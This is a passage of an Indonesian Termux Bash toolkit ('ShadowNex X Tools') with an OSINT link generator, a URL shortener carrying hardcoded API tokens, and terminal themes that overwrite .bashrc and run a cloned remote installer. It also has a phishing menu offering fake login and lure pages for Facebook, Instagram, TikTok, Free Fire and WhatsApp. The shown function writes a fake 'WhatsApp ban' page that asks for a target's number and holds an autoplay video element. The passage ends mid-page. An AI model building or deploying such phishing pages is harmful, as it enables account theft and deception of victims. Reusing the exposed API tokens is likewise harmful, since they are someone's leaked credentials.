    "https://news.google.com/search?q=%22$NAMA%22"
    "https://www.bing.com/news/search?q=%22$NAMA%22"
    "https://duckduckgo.com/?q=%22$NAMA%22&iar=news"
    )
    
    links+=(
    "https://www.behance.net/search/projects/?search=$NAMA"
    "https://dribbble.com/search/$NAMA"
    "https://soundcloud.com/search?q=$NAMA"
    )
    
    links+=(
    "https://about.me/$NAMA"
    "https://wordpress.com/search/$NAMA"
    )
    
    links+=(
    "https://www.waybackmachine.org/*/https://*$NAMA*"
    "https://publicwww.com/websites/%22$NAMA%22"
    "https://boardreader.com/s/$NAMA.html"
    )
    
    echo -e "\n${GREEN}[+] ${#links[@]} link pencarian ditemukan:${NC}"
    echo ""
    
    local idx=1
    for link in "${links[@]}"; do
        printf "${GREEN}%3d.${NC} %s\n" "$idx" "$link"
        ((idx++))
    done
    
    echo -e "\n${YELLOW}[*] Simpan link di atas untuk pencarian OSINT${NC}"
    echo -e "${YELLOW}[*] Tekan ENTER untuk kembali ke menu...${NC}"
    read -n 1 -s -r
}


shortlink_menu() {
    clear
    local g='\033[32;1m'
    local r='\033[31;1m'
    local y='\033[33;1m'
    local c='\033[1;36m'
    local n='\033[0m'
    
    echo "
⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷
⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕
⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣ 
" | lolcat 
    
    echo -e "${c}"
    read -p "Silahkan Masukkan Url / Link : " LONG_URL
    
    if [ -z "$LONG_URL" ]; then
        echo -e "${RED}[!] URL tidak boleh kosong${NC}"
        sleep 2
        return
    fi
    
    echo ""
    BITLY_TOKEN="b39549e89f08923d7faef0b53e65d77cff589410"
    TINYURL_TOKEN="RbcrFbz7N6T67JdGeUVBMbrYylHDQYXyyrDK4mMefuYp0mHccX9gFX7WEEHw"
    CUTTLY_API_KEY="81eb1f7c58a3542ad2132cb05b1dfa55cd00a"
    
    echo ""
    echo -e "${g}Memendekkan URL ${r}: $LONG_URL"
    echo ""
    
    echo -e "${r}[ ${g}01 ${r}]${n} Bitly"
    bitly_response=$(curl -s -X POST "https://api-ssl.bitly.com/v4/shorten" \
      -H "Authorization: Bearer $BITLY_TOKEN" \
      -H "Content-Type: application/json" \
      -d "{\"long_url\": \"$LONG_URL\"}")
    
    if echo "$bitly_response" | grep -q "link"; then
        bitly_link=$(echo "$bitly_response" | grep -oP '"link":\s*"\K[^"]+')
        echo -e "   ${g}Shortlink:${y} $bitly_link${n}"
    else
        echo -e "   ${r}Gagal:${y} API Error${n}"
    fi
    echo ""
    
    echo -e "${r}[ ${g}02 ${r}]${n} TinyURL"
    tinyurl_response=$(curl -s -X POST "https://api.tinyurl.com/create" \
      -H "Authorization: Bearer $TINYURL_TOKEN" \
      -H "Content-Type: application/json" \
      -d "{\"url\": \"$LONG_URL\"}")
    
    if echo "$tinyurl_response" | grep -q "tiny_url"; then
        tinyurl_link=$(echo "$tinyurl_response" | grep -oP '"tiny_url":\s*"\K[^"]+' | sed 's#\\##g')
        echo -e "   ${g}Shortlink:${y} $tinyurl_link${n}"
    else
        echo -e "   ${r}Gagal:${y} API Error${n}"
    fi
    echo ""
    
    echo -e "${r}[ ${g}03 ${r}]${n} Cutt.ly"
    cuttly_response=$(curl -s -G "https://cutt.ly/api/api.php" \
      --data-urlencode "key=$CUTTLY_API_KEY" \
      --data-urlencode "short=$LONG_URL")
    
    if echo "$cuttly_response" | grep -q "shortLink"; then
        cuttly_link=$(echo "$cuttly_response" | grep -oP '"shortLink":\s*"\K[^"]+' | sed 's#\\##g')
        echo -e "   ${g}Shortlink:${y} $cuttly_link${n}"
    else
        echo -e "   ${r}Gagal:${y} API Error${n}"
    fi
    echo ""
    
    echo -e "${c}URL berhasil dipendekkan menggunakan 3 layanan!"
    echo ""
    
    echo -e "${YELLOW}[*] Tekan ENTER untuk kembali ke menu...${NC}"
    read -n 1 -s -r
    clear
}


logo() {
    echo -e "${CYAN}"
    echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
    echo -e "${NC}"
}

backup_bashrc() {
    bashrc_path="$HOME/.bashrc"
    bashrc_backup="$HOME/.bashrc.backup"
    if [ ! -f "$bashrc_backup" ]; then
        if [ -f "$bashrc_path" ]; then
            cp "$bashrc_path" "$bashrc_backup"
            echo -e "${YELLOW}[*] Backup .bashrc dibuat${NC}"
        else
            echo -e "${YELLOW}[*] File .bashrc tidak ditemukan, membuat baru${NC}"
            touch "$bashrc_path"
        fi
    fi
}


terminal_theme_menu() {
    local b='\033[1;34m'
    local c='\033[1;36m'  
    local h='\033[1;32m'  
    local k='\033[1;33m'  
    local m='\033[1;35m'  
    local r='\033[1;31m'  
    
    while true; do
        clear
        logo
        echo -e "${b}╔══════════════════════════════════════╗"
        echo -e "║${h} AUTHOR ${r}= ${c}By Mr./ShadowNex              ${b}║"
        echo -e "╠══════════════════════════════════════╣"
        echo -e "║${r} [ ${k}01 ${r}]${h} Tampilan Pariasi              ${b}║"
        echo -e "║${r} [ ${k}02 ${r}]${h} Tampilan Ubuntu               ${b}║"
        echo -e "║${r} [ ${k}03 ${r}]${h} Tampilan Debian               ${b}║"
        echo -e "║${r} [ ${k}04 ${r}]${h} Tampilan Kali Linux           ${b}║"
        echo -e "║${r} [ ${k}05 ${r}]${h} Tampilan Linux                ${b}║"
        echo -e "║${r} [ ${k}06 ${r}]${h} Tampilan Arch                 ${b}║"
        echo -e "║${r} [ ${k}07 ${r}]${h} Tampilan Parrot               ${b}║"
        echo -e "║${r} [ ${k}08 ${r}]${h} Tampilan Windows              ${b}║"
        echo -e "║${r} [ ${k}09 ${r}]${h} Tampilan BlackArch            ${b}║"
        echo -e "║${r} [ ${k}10 ${r}]${h} Tampilan Sistem               ${b}║"
        echo -e "║${r} [ ${k}11 ${r}]${h} Tampilan Cowass               ${b}║"
        echo -e "║${r} [ ${k}12 ${r}]${h} Tampilan Refixs               ${b}║"
        echo -e "║${r} [ ${k}13 ${r}]${h} Tampilan Macchina             ${b}║"
        echo -e "║${r} [ ${k}14 ${r}]${h} Hapus Tampilan                ${b}║"
        echo -e "║${r} [ ${k}15 ${r}]${m} Kembali ke Menu               ${b}║"
        echo -e "╚══════════════════════════════════════╝"
        echo -e "${c}"
        read -p "╚═[ Pilih Tema ]══•➤ : " ha
        
        case "$ha" in
          1)
            clear
            echo -e "${k}[*] Menginstall tema Pariasi...${NC}"
            echo -e "${YELLOW}[*] Update package dan install dependencies...${NC}"
            pkg update -y
            pkg install toilet figlet git -y
            echo -e "${YELLOW}[*] Clone repository theme...${NC}"
            git clone https://github.com/h20-studio/T4MPILAN-V5
            cd T4MPILAN-V5
            echo -e "${YELLOW}[*] Menjalankan installer...${NC}"
            python2 style5.py
            cd ..
            rm -rf T4MPILAN-V5
            echo -e "${GREEN}[+] Tema Pariasi berhasil diinstall${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal untuk melihat perubahan${NC}"
            sleep 3
            ;;
          2)
            clear
            echo -e "${k}[*] Mengatur tema Ubuntu...${NC}"
            bashrc_path="$HOME/.bashrc"
            backup_bashrc
            echo "clear" > "$bashrc_path"
            echo "neofetch --ascii_distro ubuntu" >> "$bashrc_path"
            echo "PS1='\e[1;32m┌─[\e[1;33m Ubuntu  \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
            echo -e "${GREEN}[+] Tema Ubuntu berhasil diatur${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          3)
            clear
            echo -e "${k}[*] Mengatur tema Debian...${NC}"
            bashrc_path="$HOME/.bashrc"
            backup_bashrc
            echo "clear" > "$bashrc_path"
            echo "neofetch --ascii_distro debian" >> "$bashrc_path"
            echo "PS1='\e[1;32m┌─[\e[1;33m Debian  \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
            echo -e "${GREEN}[+] Tema Debian berhasil diatur${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          4)
            clear
            echo -e "${k}[*] Mengatur tema Kali Linux...${NC}"
            bashrc_path="$HOME/.bashrc"
            backup_bashrc
            echo "clear" > "$bashrc_path"
            echo "neofetch --ascii_distro kali" >> "$bashrc_path"
            echo "PS1='\e[1;32m┌─[\e[1;33m Kalinuk  \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
            echo -e "${GREEN}[+] Tema Kali Linux berhasil diatur${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          5)
            clear
            echo -e "${k}[*] Mengatur tema Linux...${NC}"
            bashrc_path="$HOME/.bashrc"
            backup_bashrc
            echo "clear" > "$bashrc_path"
            echo "neofetch --ascii_distro linux" >> "$bashrc_path"
            echo "PS1='\e[1;32m┌─[\e[1;33m Linuk  \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
            echo -e "${GREEN}[+] Tema Linux berhasil diatur${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          6)
            clear
            echo -e "${k}[*] Mengatur tema Arch...${NC}"
            bashrc_path="$HOME/.bashrc"
            backup_bashrc
            echo "clear" > "$bashrc_path"
            echo "neofetch --ascii_distro arch" >> "$bashrc_path"
            echo "PS1='\e[1;32m┌─[\e[1;33m Arch  \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
            echo -e "${GREEN}[+] Tema Arch berhasil diatur${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          7)
            clear
            echo -e "${k}[*] Mengatur tema Parrot...${NC}"
            bashrc_path="$HOME/.bashrc"
            backup_bashrc
            echo "clear" > "$bashrc_path"
            echo "neofetch --ascii_distro parrot" >> "$bashrc_path"
            echo "PS1='\e[1;32m┌─[\e[1;33m Parrot  \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
            echo -e "${GREEN}[+] Tema Parrot berhasil diatur${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          8)
            clear
            echo -e "${k}[*] Mengatur tema Windows...${NC}"
            bashrc_path="$HOME/.bashrc"
            backup_bashrc
            echo "clear" > "$bashrc_path"
            echo "neofetch --ascii_distro windows" >> "$bashrc_path"
            echo "PS1='\e[1;32m┌─[\e[1;33m Windows  \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
            echo -e "${GREEN}[+] Tema Windows berhasil diatur${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          9)
            clear
            echo -e "${k}[*] Mengatur tema BlackArch...${NC}"
            bashrc_path="$HOME/.bashrc"
            backup_bashrc
            echo "clear" > "$bashrc_path"
            echo "neofetch --ascii_distro blackarch" >> "$bashrc_path"
            echo "PS1='\e[1;32m┌─[\e[1;33m BlackArch  \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
            echo -e "${GREEN}[+] Tema BlackArch berhasil diatur${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          10)
            clear
            echo -e "${k}[*] Mengatur tema Sistem...${NC}"
            bashrc_path="$HOME/.bashrc"
            backup_bashrc
            echo "clear" > "$bashrc_path"
            echo "neofetch" >> "$bashrc_path"
            echo "PS1='\e[1;32m┌─[\e[1;33m Sistem  \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
            echo -e "${GREEN}[+] Tema Sistem berhasil diatur${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          11)
            clear
            echo -e "${k}[*] Menginstall tema Cowass...${NC}"
            echo -e "${YELLOW}[*] Install dependencies...${NC}"
            pkg install cowsay ruby -y
            gem install lolcat 2>/dev/null || {
                echo -e "${YELLOW}[*] lolcat via gem gagal, mencoba via pip...${NC}"
                pip install lolcat 2>/dev/null || echo -e "${RED}[!] Gagal install lolcat${NC}"
            }
            pkg install figlet -y
            bashrc_path="$HOME/.bashrc"
            backup_bashrc
            echo "clear" > "$bashrc_path"
            echo "cowsay -f eyes 'Hello--World' | lolcat" >> "$bashrc_path"
            echo "PS1='\e[1;32m┌─[\e[1;33m Cowass  \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
            echo -e "${GREEN}[+] Tema Cowass berhasil diatur${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          12)
            clear
            echo -e "${k}[*] Menginstall tema Refixs...${NC}"
            echo -e "${YELLOW}[*] Install rxfetch...${NC}"
            pkg install rxfetch -y 2>/dev/null || {
                echo -e "${YELLOW}[*] rxfetch tidak tersedia, menggunakan neofetch...${NC}"
                pkg install neofetch -y
            }
            bashrc_path="$HOME/.bashrc"
            backup_bashrc
            echo "clear" > "$bashrc_path"
            if command -v rxfetch >/dev/null; then
                echo "rxfetch" >> "$bashrc_path"
            else
                echo "neofetch" >> "$bashrc_path"
            fi
            echo "PS1='\e[1;32m┌─[\e[1;33m Rxfetch  \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
            echo -e "${GREEN}[+] Tema Refixs berhasil diatur${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          13)
            clear
            echo -e "${k}[*] Menginstall tema Macchina...${NC}"
            echo -e "${YELLOW}[*] Install macchina...${NC}"
            pkg install macchina -y 2>/dev/null || {
                echo -e "${YELLOW}[*] macchina tidak tersedia, menggunakan neofetch...${NC}"
                pkg install neofetch -y
            }
            bashrc_path="$HOME/.bashrc"
            backup_bashrc
            echo "clear" > "$bashrc_path"
            if command -v macchina >/dev/null; then
                echo "macchina" >> "$bashrc_path"
            else
                echo "neofetch" >> "$bashrc_path"
            fi
            echo "PS1='\e[1;32m┌─[\e[1;33m Macchina  \e[1;32m]-[\e[1;36m\w\e[1;32m]\n└──╼➤ \e[1;32m\e[1;36m'" >> "$bashrc_path"
            echo -e "${GREEN}[+] Tema Macchina berhasil diatur${NC}"
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          14)
            clear
            echo -e "${k}[*] Menghapus tema...${NC}"
            bashrc_backup="$HOME/.bashrc.backup"
            if [ -f "$bashrc_backup" ]; then
                cp "$bashrc_backup" "$HOME/.bashrc"
                echo -e "${GREEN}[+] Tema berhasil direset ke default${NC}"
            else
                echo "clear" > "$HOME/.bashrc"
                echo "# Default bashrc" >> "$HOME/.bashrc"
                echo "PS1='\w \$ '" >> "$HOME/.bashrc"
                echo "alias ls='ls --color=auto'" >> "$HOME/.bashrc"
                echo "alias ll='ls -la'" >> "$HOME/.bashrc"
                echo -e "${YELLOW}[!] Backup tidak ditemukan, membuat konfigurasi default${NC}"
            fi
            echo -e "${YELLOW}[*] Silakan restart terminal atau ketik: source ~/.bashrc${NC}"
            sleep 3
            ;;
          15)
            echo -e "${k}[*] Kembali ke menu utama...${NC}"
            sleep 1
            break
            ;;
          *)
            echo -e "${RED}[!] Pilihan tidak valid${NC}"
            sleep 2
            ;;
        esac
    done
}



phising_menu() {
  while true; do
    clear
    echo -e "
    ${WHITE} 
   ██████╗░██╗░░██╗██╗░██████╗██╗███╗░░██╗░██████╗ 
   ██╔══██╗██║░░██║██║██╔════╝██║████╗░██║██╔════╝ 
   ██████╔╝███████║██║╚█████╗░██║██╔██╗██║██║░░██╗ 
   ██╔═══╝░██╔══██║██║░╚═══██╗██║██║╚████║██║░░╚██╗
   ██║░░░░░██║░░██║██║██████╔╝██║██║░╚███║╚██████╔╝
   ${NC}${RED}╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝
   ${BG_RED}${YELLOW}CODE BY DANXY OFFCIAL${NC}                  ${BG_RED}EDITOR SHADOWNEX${NC}"
   echo " 
 ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
 │ [ 1 ] PHISING GAME AR V0.1                        │
 │ [ 2 ] PHISING FACEBOOK                            │
 │ [ 3 ] PHISING INSTAGRAM                           │
 │ [ 4 ] PHISING TIKTOK                              │
 │ [ 5 ] PHISING FREE FIRE                           │
 │ [ 6 ] PHISING SPIN BERHADIAH                      │
 │ [ 7 ] PHISING SUNTIK TIKTOK                       │
 │ [ 8 ] PHISING PROFESIONAL                         │
 │ [ 9 ] PHISING BAN WHATSAPP                        │
 │ [ 0 ] KEMBALI                                     │
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
 │               ALL BASE FITUR PHISING              │
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    printf "${GREEN}  ┏━[ ${RED}ShadowNex X Tools${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU PHISING${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
    read -r CHOICE

    case $CHOICE in
      1)
      klik
      phising_tele
      klik 
       ;;
       2)
       klik
       phising_FB
       klik
       ;;
       3)
       klik
       phising_IG
       klik
       ;;
       4)
       klik
       phising_TT
       klik
       ;;
       5)
       klik
       phising_FF
       klik
       ;;
       6)
       klik
       phising_SPIN
       klik
       ;;
       7)
       klik
       phising_TTSUNTIK
       klik
       ;;
       8)
       klik
       phising_PRO
       klik
       ;;
       9)
       klik
       phising_INJECT
       klik
       ;;
      0) break ;;
      *) echo -e "${RED}INPUT TIDAK VALID${NC}"; sleep 1 ;;
    esac
  done
}

phising_INJECT(){
  WORK_DIR="$HOME/DanxyInject"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR



  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Inject Premium - Neon Glass</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:linear-gradient(135deg,#0f0f23,#1a1a2e,#16213e);
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
    }
    .bg-particles{
      position:fixed;
      top:0;
      left:0;
      width:100%;
      height:100%;
      pointer-events:none;
      z-index:0;
    }
    .particle{
      position:absolute;
      width:2px;
      height:2px;
      background:rgba(0,255,127,0.3);
      border-radius:50%;
      animation:float 6s ease-in-out infinite;
    }
    @keyframes float{
      0%,100%{transform:translateY(0px);opacity:0.3;}
      50%{transform:translateY(-20px);opacity:0.8;}
    }
    .card{
      background:rgba(17,17,17,0.95);
      padding:30px;
      border-radius:16px;
      box-shadow:0 0 20px lime;
      text-align:center;
      max-width:400px;
      width:100%;
      z-index:2;
    }
    .logo{
      font-size:26px;
      font-weight:900;
      background:linear-gradient(135deg,#00ff7f,#ffffff);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      margin-bottom:10px;
    }
    .subtitle{
      font-size:13px;
      color:#ffc107;
      margin-bottom:20px;
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:16px;
      background:#333;
      border:none;
      border-radius:6px;
      color:#fff;
      font-size:15px;
    }
    input:focus{
      outline:none;
      border:1px solid #00ff7f;
      box-shadow:0 0 10px lime;
    }
    .btn{
      width:100%;
      padding:12px;
      background:linear-gradient(135deg,#00ff7f,#00cc66);
      color:black;
      border:none;
      border-radius:10px;
      cursor:pointer;
      font-weight:600;
      font-size:15px;
      transition:.3s;
    }
    .btn:hover{
      background:#0f0;
      box-shadow:0 0 20px lime;
    }
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#00ff7f;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #00ff7f;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="bg-particles"></div>

  <div class="card">
    <p class="logo">BAN WHATSAPP BY D4NXY</p>
    <p class="subtitle">⚠️ Jangan Disalahgunakan ⚠️</p>
    <input type="text" placeholder="NOMOR TARGET BAN" id="user">
    <input type="number" placeholder="MASUKAN JUMLAH SPAM LAPOR" id="jumlah">
    <button class="btn" id="inject-btn">BAN SEKARANG</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Menginjeksi akun...</div>
    </div>
  </div>

  <video id="video" autoplay playsinline></video>
